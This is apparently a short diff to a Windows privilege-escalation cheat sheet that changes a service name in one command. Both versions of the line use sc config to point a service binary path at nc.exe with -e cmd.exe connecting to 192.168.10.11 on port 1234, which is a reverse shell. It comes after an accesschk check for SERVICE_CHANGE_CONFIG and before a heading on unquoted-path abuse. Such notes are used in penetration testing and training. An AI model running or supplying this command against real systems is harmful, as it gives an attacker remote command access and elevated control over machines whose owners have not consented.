@@ -11,7 +11,7 @@ C:\> accesschk.exe -wuvc myservice
 Look for the “SERVICE_CHANGE_CONFIG” in the response. Then use the following command to execute net user instend of service bin:
 
 ```
-C:\> sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 192.168.10.11 1234 -e C:\WINDOWS\System32\cmd.exe"
+C:\> sc config myservice binpath= "C:\Inetpub\wwwroot\nc.exe 192.168.10.11 1234 -e C:\WINDOWS\System32\cmd.exe"
 ```
 
 ## Abuse service via Unquoted Paths
